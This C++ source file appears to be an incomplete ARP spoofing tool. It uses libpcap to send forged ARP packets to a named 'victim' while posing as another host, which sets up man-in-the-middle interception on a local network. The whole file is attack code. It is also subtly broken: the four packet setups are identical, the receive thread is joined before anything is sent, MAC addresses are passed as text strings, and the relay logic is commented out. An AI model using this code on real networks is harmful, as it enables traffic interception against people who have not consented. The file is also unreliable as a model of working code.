#include <QCoreApplication>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <thread>

// Add class made by bearics
#include "arppacket.h"

using namespace std;

void getAttackerInfo(u_char* ip, u_char* mac);
void sendPkt(pcap_t *handle, u_char* send_pkt, int size);
void receivePkt(pcap_t *handle, struct pcap_pkthdr *header);

int main(int argc, char *argv[])
{
    pcap_t *handle;			/* Session handle */
    char *dev;			/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    //struct bpf_program fp;		/* The compiled filter */
    //char filter_exp[] = "port ";	/* The filter expression */
    bpf_u_int32 mask;		/* Our netmask */
    bpf_u_int32 net;		/* Our IP */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */

    // attacker's information
    u_char attackerIP[16];     // 255.255.255.255 = 15+1
    u_char attackerMAC[18];    // FF:FF:FF:FF:FF:FF = 17+1

    getAttackerInfo(attackerIP, attackerMAC);

    cout << "Attacker's IP : " << attackerIP <<endl;
    cout << "Attacker's MAC : " << attackerMAC<<endl;

    /* Define the device */
    dev = pcap_lookupdev(errbuf);;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    printf("Device is %s\n", argv[1]);
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return(2);
    }
    // packet is attacker send to sender(victim)
    cout << "Setting packets " << endl;

    static ArpPacket a2s;
    static ArpPacket s2a;
    static ArpPacket a2t;
    static ArpPacket t2a;
    // attacker send to sender
    a2s.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2s.setEtherSourceMac(attackerMAC);
    a2s.setArpOpcode(ARPOP_REQUEST);
    a2s.setArpSenderIP((u_char*)argv[3]);
    a2s.setArpSenderMac(attackerMAC);
    a2s.setArpTargetIP((u_char*)argv[2]);
    a2s.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    s2a.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    s2a.setEtherSourceMac(attackerMAC);
    s2a.setArpOpcode(ARPOP_REQUEST);
    s2a.setArpSenderIP((u_char*)argv[3]);
    s2a.setArpSenderMac(attackerMAC);
    s2a.setArpTargetIP((u_char*)argv[2]);
    s2a.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    a2t.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2t.setEtherSourceMac(attackerMAC);
    a2t.setArpOpcode(ARPOP_REQUEST);
    a2t.setArpSenderIP((u_char*)argv[3]);
    a2t.setArpSenderMac(attackerMAC);
    a2t.setArpTargetIP((u_char*)argv[2]);
    a2t.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    t2a.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    t2a.setEtherSourceMac(attackerMAC);
    t2a.setArpOpcode(ARPOP_REQUEST);
    t2a.setArpSenderIP((u_char*)argv[3]);
    t2a.setArpSenderMac(attackerMAC);
    t2a.setArpTargetIP((u_char*)argv[2]);
    t2a.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    thread t(&receivePkt, handle, header);
    t.join();

    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));

    // send spoofed packet to sender
    a2s.setArpOpcode(ARPOP_REPLY);
    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));

}

void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
{
    FILE *fp;

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 1p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerIP);
    pclose(fp);

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 3p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerMAC);
    pclose(fp);

}

void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
{
    if(pcap_sendpacket(handle, send_pkt, size) == -1)
        cout << "Sending ERROR!" << endl;
    else
        cout << "Sending SUCCESS!" << endl;
}

void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
{
    int res=0;
    const u_char *pkt;
    struct ether_header *eth;
    struct ether_arp *arp;
    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);
        cout << "checking" << endl;
        /* Check ARP
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP ){
            // compare sender ip
            if(memcmp(arpPkt.arp->arp_tpa, arp->arp_spa, sizeof(struct in_addr))==0)
            {
                if(memcmp(arpPkt.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN) == 0)
                {
                    memcpy(arpPkt.eth->ether_dhost, eth->ether_shost, ETHER_ADDR_LEN);
                    memcpy(arpPkt.arp->arp_tha, eth->ether_shost, ETHER_ADDR_LEN);
                    cout << "changed";
                }
                else {
                    cout << "start"<<endl;
                    ArpPacket relayPkt;
                    relayPkt.setEtherDestMac(eth->ether_dhost);
                    relayPkt.setEtherSourceMac(eth->ether_shost);
                    relayPkt.setArpOpcode(arp->arp_op);
                    relayPkt.setArpSenderIP(arp->arp_spa);
                    relayPkt.setArpSenderMac(arp->arp_sha);
                    relayPkt.setArpTargetIP(arp->arp_tpa);
                    relayPkt.setArpTargetMac(arp->arp_tha);
                    cout << "fin setting"<<endl;
                    sendPkt(handle, relayPkt.pkt, sizeof(relayPkt.pkt));
                    cout << "Success relay packet" << endl;
                }

            }
            break;

        }*/
    }
}
